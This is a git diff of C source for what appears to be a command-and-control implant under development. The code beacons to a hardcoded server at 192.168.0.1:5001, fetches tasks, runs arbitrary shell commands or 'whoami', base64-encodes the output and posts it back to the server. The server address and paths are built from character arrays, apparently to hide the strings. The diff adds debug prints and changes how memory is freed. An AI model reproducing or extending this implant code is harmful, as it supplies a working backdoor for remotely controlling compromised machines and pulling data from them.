@@ -290,7 +290,8 @@ void myMain()
     WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
     WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
     WCHAR uuid[] = { '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0 };
-    WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
+    //WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
+    WCHAR fullPath[] = { '/', 't', 'a', 's', 'k', 's', '/', '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0 };
     INTERNET_PORT port = 5001;
 
     CHAR* jsonResponse = NULL;
@@ -299,6 +300,7 @@ void myMain()
     CHAR* agentUuid = { 0 };
     CHAR* b64Task;
     CHAR* task = NULL;
+    CHAR* orgOutput;
     DWORD taskSize;
     CHAR* taskOutput;
     CHAR* b64EncodedOutput;
@@ -321,13 +323,16 @@ void myMain()
         'a', '2', 'f', '0', 'd', '0', 0
     };
 
+    ((PRINTF)api->printf)("NOT HERE 0\n");
     while (TRUE)
     {
+        ((PRINTF)api->printf)("NOT HERE 1\n");
         jsonResponse = GetRequest(api, wServer, port, fullPath);
+        ((PRINTF)api->printf)("NOT HERE 2\n");
 
-        if (jsonResponse == NULL)
+        if (!jsonResponse)
         {
-            ((PRINTF)api->printf)("\njsonResponse is NULL, sleeping...\n");
+            ((PRINTF)api->printf)("\njsonResponse is empty, sleeping...\n");
             ((SLEEP)api->Sleep)(3000);
             continue;
         }
@@ -376,18 +381,18 @@ void myMain()
 
         if (my_strcmp(taskType, "cmd") == 0)
         {
-            CHAR* tmpOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput);
-            taskOutput = myTrim(tmpOutput, '\n');
-            if (tmpOutput)
-            { ((FREE)api->free)(tmpOutput); }
+            orgOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput);
+            taskOutput = myTrim(orgOutput, '\n');
         }
         else if (my_strcmp(taskType, "whoami") == 0)
         {
-            taskOutput = myTrim(((WHOAMI)PEsgStdApi->Whoami)(), '\n');
+            orgOutput = ((WHOAMI)PEsgStdApi->Whoami)();
+            taskOutput = myTrim(orgOutput, '\n');
             ((PRINTF)api->printf)("\ntaskOutput: \n%s\n", taskOutput);
         }
         else
         {
+            orgOutput = "oops";
             taskOutput = "oops";
             ((PRINTF)api->printf)("unknown task type, you f'ed up, this should never happen");
         }
@@ -404,12 +409,10 @@ void myMain()
         ((PRINTF)api->printf)("\njson: %s\n", json);
         PostRequest(api, wServer, port, fullPath2, json);
 
-        /*
-        if (taskOutput)
+        if (orgOutput)
         {
-            ((FREE)api->free)(taskOutput);
+            ((FREE)api->free)(orgOutput);
         }
-        */
         if (b64EncodedOutput)
         {
             ((FREE)api->free)(b64EncodedOutput);
@@ -429,9 +432,11 @@ void myMain()
 
         ((SLEEP)api->Sleep)(3000);
     }
+    /*
     if (fullPath)
     {
         ((FREE)api->free)(fullPath);
     }
+    */
 }
 
